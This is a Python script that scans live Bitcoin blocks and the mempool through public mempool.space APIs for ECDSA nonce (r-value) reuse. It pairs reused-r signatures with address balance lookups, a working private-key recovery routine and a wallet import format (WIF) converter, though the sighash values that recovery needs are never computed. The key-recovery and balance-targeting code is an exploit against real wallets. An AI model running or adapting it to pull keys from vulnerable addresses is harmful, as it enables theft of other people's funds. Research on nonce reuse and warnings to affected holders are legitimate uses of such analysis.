#!/usr/bin/env python3
"""
Scan Bitcoin Mainnet blocks and mempool for ECDSA nonce reuse (r-value reuse)
vulnerabilities. Extracts DER-encoded signatures from P2PKH/P2WPKH inputs and
flags addresses where the same 'r' value appears in multiple signatures.

Uses the mempool.space API (no authentication required).
"""

import argparse
import hashlib
import json
import logging
import sys
import time
from collections import defaultdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("btc_scan_results.log", mode="w"),
    ],
)
logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
# secp256k1 curve order
N_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

MEMPOOL_API_ENDPOINTS = [
    "https://mempool.space/api",
    "https://mempool.emzy.de/api",
    "https://mempool.bisq.services/api",
]


# ---------------------------------------------------------------------------
# HTTP Session
# ---------------------------------------------------------------------------
def _build_session(timeout: int = 15, retries: int = 3) -> requests.Session:
    session = requests.Session()
    retry = Retry(
        total=retries,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.timeout = timeout
    return session


# ---------------------------------------------------------------------------
# API Client
# ---------------------------------------------------------------------------
class MempoolAPIClient:
    """Client for mempool.space REST API."""

    def __init__(self, base_url: Optional[str] = None, timeout: int = 15) -> None:
        self.base_url = (base_url or MEMPOOL_API_ENDPOINTS[0]).rstrip("/")
        self.timeout = timeout
        self.session = _build_session(timeout=timeout)
        self._rate_limit_delay = 0.25  # seconds between requests

    def _get(self, endpoint: str) -> Any:
        url = f"{self.base_url}{endpoint}"
        time.sleep(self._rate_limit_delay)
        resp = self.session.get(url, timeout=self.timeout)
        if resp.status_code == 429:
            logger.warning("Rate limited, waiting 10s...")
            time.sleep(10)
            resp = self.session.get(url, timeout=self.timeout)
        resp.raise_for_status()
        return resp.json()

    def _get_text(self, endpoint: str) -> str:
        url = f"{self.base_url}{endpoint}"
        time.sleep(self._rate_limit_delay)
        resp = self.session.get(url, timeout=self.timeout)
        resp.raise_for_status()
        return resp.text.strip()

    def get_tip_height(self) -> int:
        return int(self._get_text("/blocks/tip/height"))

    def get_block_hash(self, height: int) -> str:
        return self._get_text(f"/block-height/{height}")

    def get_block_txs(self, block_hash: str, start_index: int = 0) -> List[Dict]:
        return self._get(f"/block/{block_hash}/txs/{start_index}")

    def get_block_tx_count(self, block_hash: str) -> int:
        """Get number of transactions in a block."""
        block_info = self._get(f"/block/{block_hash}")
        return block_info.get("tx_count", 0)

    def get_mempool_recent(self) -> List[Dict]:
        return self._get("/mempool/recent")

    def get_mempool_txids(self) -> List[str]:
        return self._get("/mempool/txids")

    def get_transaction(self, txid: str) -> Dict:
        return self._get(f"/tx/{txid}")

    def get_address_info(self, address: str) -> Dict:
        return self._get(f"/address/{address}")

    def get_address_utxos(self, address: str) -> List[Dict]:
        return self._get(f"/address/{address}/utxo")


# ---------------------------------------------------------------------------
# DER Signature Parsing
# ---------------------------------------------------------------------------
def parse_der_signature(sig_hex: str) -> Optional[Dict[str, Any]]:
    """Parse a DER-encoded ECDSA signature and extract r, s values.

    The last byte is the sighash type flag and is not part of the DER encoding.
    """
    try:
        if not sig_hex or len(sig_hex) < 14:
            return None

        offset = 0
        # SEQUENCE tag
        if sig_hex[offset:offset + 2] != "30":
            return None
        offset += 2

        total_length = int(sig_hex[offset:offset + 2], 16)
        offset += 2

        # INTEGER tag for r
        if sig_hex[offset:offset + 2] != "02":
            return None
        offset += 2

        r_length = int(sig_hex[offset:offset + 2], 16) * 2
        offset += 2
        r_hex = sig_hex[offset:offset + r_length]
        offset += r_length

        # INTEGER tag for s
        if sig_hex[offset:offset + 2] != "02":
            return None
        offset += 2

        s_length = int(sig_hex[offset:offset + 2], 16) * 2
        offset += 2
        s_hex = sig_hex[offset:offset + s_length]
        offset += s_length

        # Sighash type (last byte of the full signature including sighash)
        sighash = sig_hex[offset:offset + 2] if offset + 2 <= len(sig_hex) else "01"

        r_int = int(r_hex, 16)
        s_int = int(s_hex, 16)

        return {
            "r": r_hex,
            "s": s_hex,
            "r_int": r_int,
            "s_int": s_int,
            "sighash": sighash,
            "r_bits": r_int.bit_length(),
            "s_bits": s_int.bit_length(),
        }
    except (ValueError, IndexError):
        return None


def _read_pushdata(script_hex: str, offset: int) -> Tuple[Optional[str], int]:
    """Read a push-data element from a script hex string."""
    if offset + 2 > len(script_hex):
        return None, offset

    opcode = int(script_hex[offset:offset + 2], 16)
    offset += 2

    if opcode <= 75:
        data_len = opcode * 2
    elif opcode == 76:  # OP_PUSHDATA1
        if offset + 2 > len(script_hex):
            return None, offset
        data_len = int(script_hex[offset:offset + 2], 16) * 2
        offset += 2
    elif opcode == 77:  # OP_PUSHDATA2
        if offset + 4 > len(script_hex):
            return None, offset
        data_len = int.from_bytes(bytes.fromhex(script_hex[offset:offset + 4]), "little") * 2
        offset += 4
    else:
        return None, offset

    if offset + data_len > len(script_hex):
        return None, offset

    data = script_hex[offset:offset + data_len]
    return data, offset + data_len


def extract_signatures_from_scriptsig(scriptsig_hex: str) -> List[Dict[str, Any]]:
    """Extract DER signatures and pubkeys from a P2PKH scriptSig."""
    if not scriptsig_hex:
        return []

    signatures = []
    offset = 0
    elements = []

    while offset < len(scriptsig_hex):
        data, offset = _read_pushdata(scriptsig_hex, offset)
        if data is None:
            break
        elements.append(data)

    for element in elements:
        if len(element) >= 140 and element[:2] == "30":
            # Looks like a DER signature (with sighash byte)
            parsed = parse_der_signature(element)
            if parsed:
                # Find associated pubkey (next push of 33 or 65 bytes)
                pubkey = None
                for other in elements:
                    if len(other) in (66, 130) and other[:2] in ("02", "03", "04"):
                        pubkey = other
                        break
                parsed["pubkey"] = pubkey
                signatures.append(parsed)

    return signatures


def extract_signatures_from_witness(witness: List[str]) -> List[Dict[str, Any]]:
    """Extract DER signatures from witness data (P2WPKH/P2WSH)."""
    if not witness:
        return []

    signatures = []
    pubkey = None

    for item in witness:
        if len(item) in (66, 130) and item[:2] in ("02", "03", "04"):
            pubkey = item
        elif len(item) >= 140 and item[:2] == "30":
            parsed = parse_der_signature(item)
            if parsed:
                signatures.append(parsed)

    for sig in signatures:
        if pubkey and not sig.get("pubkey"):
            sig["pubkey"] = pubkey

    return signatures


# ---------------------------------------------------------------------------
# Transaction Signature Extraction
# ---------------------------------------------------------------------------
def extract_all_signatures(tx: Dict) -> List[Dict[str, Any]]:
    """Extract all ECDSA signatures from a transaction's inputs."""
    results = []
    txid = tx.get("txid", "unknown")

    for vin_idx, vin in enumerate(tx.get("vin", [])):
        # Skip coinbase transactions
        if vin.get("is_coinbase"):
            continue

        prevout = vin.get("prevout", {})
        address = prevout.get("scriptpubkey_address", "")
        script_type = prevout.get("scriptpubkey_type", "")

        # P2PKH: signature is in scriptsig
        scriptsig = vin.get("scriptsig", "")
        sigs_from_script = extract_signatures_from_scriptsig(scriptsig)

        # P2WPKH/P2WSH: signature is in witness
        witness = vin.get("witness", [])
        sigs_from_witness = extract_signatures_from_witness(witness)

        all_sigs = sigs_from_script + sigs_from_witness

        for sig in all_sigs:
            sig["txid"] = txid
            sig["vin_index"] = vin_idx
            sig["address"] = address
            sig["script_type"] = script_type
            results.append(sig)

    return results


# ---------------------------------------------------------------------------
# R-value Reuse Detection
# ---------------------------------------------------------------------------
def find_r_reuse(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Find signatures with reused r values (same address)."""
    # Group by (address, r_hex)
    r_map: Dict[Tuple[str, str], List[Dict]] = defaultdict(list)
    for sig in signatures:
        addr = sig.get("address", "")
        r_hex = sig.get("r", "")
        if addr and r_hex:
            r_map[(addr, r_hex)].append(sig)

    findings = []
    for (address, r_hex), sigs in r_map.items():
        if len(sigs) >= 2:
            findings.append({
                "type": "r_value_reuse",
                "address": address,
                "r_value": r_hex,
                "r_int": sigs[0]["r_int"],
                "signature_count": len(sigs),
                "signatures": sigs,
                "risk": "CRITICAL",
                "private_key_recoverable": True,
            })

    return findings


def find_r_reuse_global(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Find r-value reuse across ALL signatures (even different addresses with same pubkey)."""
    # Group by (pubkey, r_hex) for cross-address detection
    r_map: Dict[Tuple[str, str], List[Dict]] = defaultdict(list)
    for sig in signatures:
        pubkey = sig.get("pubkey", "")
        r_hex = sig.get("r", "")
        if pubkey and r_hex:
            r_map[(pubkey, r_hex)].append(sig)

    findings = []
    for (pubkey, r_hex), sigs in r_map.items():
        if len(sigs) >= 2:
            addresses = list(set(s.get("address", "") for s in sigs))
            findings.append({
                "type": "r_value_reuse_global",
                "pubkey": pubkey,
                "addresses": addresses,
                "r_value": r_hex,
                "r_int": sigs[0]["r_int"],
                "signature_count": len(sigs),
                "signatures": sigs,
                "risk": "CRITICAL",
            })

    return findings


# ---------------------------------------------------------------------------
# Private Key Recovery
# ---------------------------------------------------------------------------
def recover_private_key(sig1: Dict, sig2: Dict) -> Optional[Dict[str, str]]:
    """Recover private key from two signatures with the same r value.

    Given two signatures (r, s1, z1) and (r, s2, z2) with the same k:
        k = (z1 - z2) / (s1 - s2) mod n
        d = (s1*k - z1) / r mod n
    """
    try:
        r = sig1["r_int"]
        s1, s2 = sig1["s_int"], sig2["s_int"]
        z1 = sig1.get("z")
        z2 = sig2.get("z")

        if z1 is None or z2 is None:
            return None
        if z1 == z2 and s1 == s2:
            return None  # identical signatures, no info gain

        numerator = (z1 - z2) % N_ORDER
        denominator = (s1 - s2) % N_ORDER
        if denominator == 0:
            # Try with -s2 (low-s normalization)
            denominator = (s1 + s2) % N_ORDER
            if denominator == 0:
                return None

        k = (numerator * pow(denominator, -1, N_ORDER)) % N_ORDER
        r_inv = pow(r, -1, N_ORDER)
        private_key = ((s1 * k - z1) * r_inv) % N_ORDER

        # Verify with second signature
        private_key_check = ((s2 * k - z2) * r_inv) % N_ORDER
        if private_key != private_key_check:
            # Try negative k
            k = N_ORDER - k
            private_key = ((s1 * k - z1) * r_inv) % N_ORDER
            private_key_check = ((s2 * k - z2) * r_inv) % N_ORDER
            if private_key != private_key_check:
                return None

        if private_key == 0 or private_key >= N_ORDER:
            return None

        return {
            "private_key_hex": hex(private_key)[2:].zfill(64),
            "private_key_int": str(private_key),
            "k_hex": hex(k)[2:].zfill(64),
        }
    except (ValueError, ZeroDivisionError):
        return None


def private_key_to_wif(private_key_hex: str, compressed: bool = True) -> str:
    """Convert private key hex to Wallet Import Format (WIF)."""
    try:
        import base58
    except ImportError:
        return "N/A (install base58)"

    extended = "80" + private_key_hex
    if compressed:
        extended += "01"
    hash1 = hashlib.sha256(bytes.fromhex(extended)).digest()
    hash2 = hashlib.sha256(hash1).digest()
    checksum = hash2[:4].hex()
    return base58.b58encode(bytes.fromhex(extended + checksum)).decode("utf-8")


# ---------------------------------------------------------------------------
# Scanning Functions
# ---------------------------------------------------------------------------
def scan_blocks(
    client: MempoolAPIClient,
    start_height: int,
    end_height: int,
    output_file: Optional[str] = None,
) -> Dict[str, Any]:
    """Scan a range of Bitcoin blocks for r-value reuse."""
    all_signatures: List[Dict[str, Any]] = []
    stats = {
        "blocks_scanned": 0,
        "transactions_processed": 0,
        "signatures_extracted": 0,
    }

    logger.info(f"Scanning blocks {start_height:,} to {end_height:,}...")

    for height in range(start_height, end_height + 1):
        try:
            block_hash = client.get_block_hash(height)
            tx_count = client.get_block_tx_count(block_hash)
            logger.info(f"  Block {height:,} ({block_hash[:16]}...) - {tx_count} txs")

            # Paginate through block transactions (25 per page)
            for page_start in range(0, tx_count, 25):
                txs = client.get_block_txs(block_hash, start_index=page_start)
                for tx in txs:
                    sigs = extract_all_signatures(tx)
                    all_signatures.extend(sigs)
                    stats["transactions_processed"] += 1
                    stats["signatures_extracted"] += len(sigs)

            stats["blocks_scanned"] += 1

        except requests.HTTPError as e:
            logger.warning(f"  Error fetching block {height}: {e}")
            continue
        except Exception as e:
            logger.warning(f"  Unexpected error at block {height}: {e}")
            continue

    # Analyze
    results = _analyze_and_report(all_signatures, stats, client, output_file)
    return results


def scan_mempool(
    client: MempoolAPIClient,
    max_txs: int = 200,
    output_file: Optional[str] = None,
) -> Dict[str, Any]:
    """Scan the Bitcoin mempool for r-value reuse."""
    all_signatures: List[Dict[str, Any]] = []
    stats = {
        "mempool_txs_scanned": 0,
        "signatures_extracted": 0,
    }

    logger.info(f"Scanning mempool (up to {max_txs} transactions)...")

    try:
        txids = client.get_mempool_txids()
        txids_to_scan = txids[:max_txs]
        logger.info(f"  Mempool has {len(txids):,} unconfirmed txs, scanning {len(txids_to_scan)}")
    except Exception as e:
        logger.error(f"Failed to get mempool txids: {e}")
        return {"error": str(e)}

    for i, txid in enumerate(txids_to_scan):
        if (i + 1) % 50 == 0:
            logger.info(f"  Progress: {i + 1}/{len(txids_to_scan)} mempool txs")
        try:
            tx = client.get_transaction(txid)
            sigs = extract_all_signatures(tx)
            all_signatures.extend(sigs)
            stats["mempool_txs_scanned"] += 1
            stats["signatures_extracted"] += len(sigs)
        except requests.HTTPError:
            continue
        except Exception:
            continue

    results = _analyze_and_report(all_signatures, stats, client, output_file)
    return results


def _analyze_and_report(
    all_signatures: List[Dict],
    stats: Dict,
    client: MempoolAPIClient,
    output_file: Optional[str],
) -> Dict[str, Any]:
    """Analyze collected signatures for r-value reuse and report findings."""
    logger.info(f"\nAnalyzing {len(all_signatures)} extracted signatures...")

    # Find r-value reuse per address
    r_reuse_findings = find_r_reuse(all_signatures)
    # Also check global (same pubkey across addresses)
    r_reuse_global = find_r_reuse_global(all_signatures)

    results: Dict[str, Any] = {
        "stats": stats,
        "r_reuse_by_address": [],
        "r_reuse_global": [],
        "low_r_signatures": [],
        "low_s_signatures": [],
    }

    # Report r-reuse findings
    for finding in r_reuse_findings:
        address = finding["address"]
        logger.critical(
            f"R-VALUE REUSE | {address} | "
            f"r={finding['r_value'][:20]}... | "
            f"{finding['signature_count']} signatures"
        )

        # Try to get balance
        try:
            addr_info = client.get_address_info(address)
            balance_sat = addr_info.get("chain_stats", {}).get("funded_txo_sum", 0) - \
                          addr_info.get("chain_stats", {}).get("spent_txo_sum", 0)
            finding["balance_btc"] = balance_sat / 1e8
        except Exception:
            finding["balance_btc"] = None

        # Attempt private key recovery (requires z values which we may not have
        # from just the API — would need raw transaction sighash computation)
        sigs = finding["signatures"]
        if len(sigs) >= 2 and sigs[0].get("z") and sigs[1].get("z"):
            pk_data = recover_private_key(sigs[0], sigs[1])
            if pk_data:
                finding["private_key"] = pk_data
                logger.critical(f"  PRIVATE KEY RECOVERED for {address}!")

        results["r_reuse_by_address"].append(finding)

    for finding in r_reuse_global:
        results["r_reuse_global"].append(finding)

    # Check for weak signatures (low bit-count r or s — potential bias)
    for sig in all_signatures:
        if sig.get("r_bits", 256) < 250:
            results["low_r_signatures"].append({
                "txid": sig.get("txid"),
                "address": sig.get("address"),
                "r_bits": sig["r_bits"],
                "r": sig["r"],
            })
        if sig.get("s_bits", 256) < 250:
            results["low_s_signatures"].append({
                "txid": sig.get("txid"),
                "address": sig.get("address"),
                "s_bits": sig["s_bits"],
                "s": sig["s"],
            })

    # Save results
    if output_file:
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        # Make JSON-serializable (remove non-serializable items)
        serializable = json.loads(json.dumps(results, default=str))
        with open(output_path, "w") as f:
            json.dump(serializable, f, indent=2)
        logger.info(f"Results saved to {output_file}")

    return results


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def get_working_api() -> str:
    """Test and return a working mempool.space API endpoint."""
    session = _build_session(timeout=10)
    for endpoint in MEMPOOL_API_ENDPOINTS:
        try:
            resp = session.get(f"{endpoint}/blocks/tip/height", timeout=10)
            if resp.status_code == 200 and int(resp.text.strip()) > 0:
                logger.info(f"Connected to {endpoint}")
                return endpoint
        except Exception as e:
            logger.debug(f"Failed {endpoint}: {e}")
            continue
    raise ConnectionError("No working mempool.space API endpoint found!")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Scan Bitcoin blocks and mempool for ECDSA nonce/r-value reuse"
    )
    parser.add_argument(
        "--mode", choices=["blocks", "mempool", "both"], default="both",
        help="Scan mode: blocks, mempool, or both (default: both)"
    )
    parser.add_argument("--start-block", type=int, default=None)
    parser.add_argument("--end-block", type=int, default=None)
    parser.add_argument(
        "--blocks", type=int, default=3,
        help="Number of recent blocks to scan (default: 3)"
    )
    parser.add_argument(
        "--mempool-txs", type=int, default=200,
        help="Max mempool transactions to scan (default: 200)"
    )
    parser.add_argument("--output", type=str, default="btc_scan_results.json")
    parser.add_argument("--api", type=str, default=None, help="Custom mempool.space API URL")

    args = parser.parse_args()

    # Connect
    api_url = args.api or get_working_api()
    client = MempoolAPIClient(base_url=api_url)

    tip_height = client.get_tip_height()
    logger.info(f"Bitcoin tip height: {tip_height:,}")

    start_time = time.time()
    all_results: Dict[str, Any] = {"mode": args.mode, "tip_height": tip_height}

    # Scan blocks
    if args.mode in ("blocks", "both"):
        end_block = args.end_block or tip_height
        start_block = args.start_block or (end_block - args.blocks + 1)
        start_block = max(0, start_block)
        end_block = min(end_block, tip_height)

        block_results = scan_blocks(
            client, start_block, end_block, output_file=None
        )
        all_results["block_scan"] = block_results

    # Scan mempool
    if args.mode in ("mempool", "both"):
        mempool_results = scan_mempool(
            client, max_txs=args.mempool_txs, output_file=None
        )
        all_results["mempool_scan"] = mempool_results

    elapsed = time.time() - start_time

    # Save combined results
    if args.output:
        output_path = Path(args.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, "w") as f:
            json.dump(all_results, f, indent=2, default=str)
        logger.info(f"All results saved to {args.output}")

    # Summary
    logger.info("\n" + "=" * 70)
    logger.info("SCAN SUMMARY")
    logger.info(f"  Duration: {elapsed:.2f}s")
    logger.info(f"  Mode: {args.mode}")

    total_r_reuse = 0
    for key in ("block_scan", "mempool_scan"):
        if key in all_results and isinstance(all_results[key], dict):
            r_reuse = all_results[key].get("r_reuse_by_address", [])
            total_r_reuse += len(r_reuse)
            stats = all_results[key].get("stats", {})
            logger.info(f"  [{key}] stats: {stats}")

    if total_r_reuse > 0:
        logger.critical(f"  R-VALUE REUSE FOUND: {total_r_reuse} address(es) affected!")
        logger.critical("  Private keys may be recoverable. Affected users should move funds.")
    else:
        logger.info("  No r-value reuse detected in scanned data.")

    logger.info("=" * 70)
    return 2 if total_r_reuse > 0 else 0


if __name__ == "__main__":
    sys.exit(main())
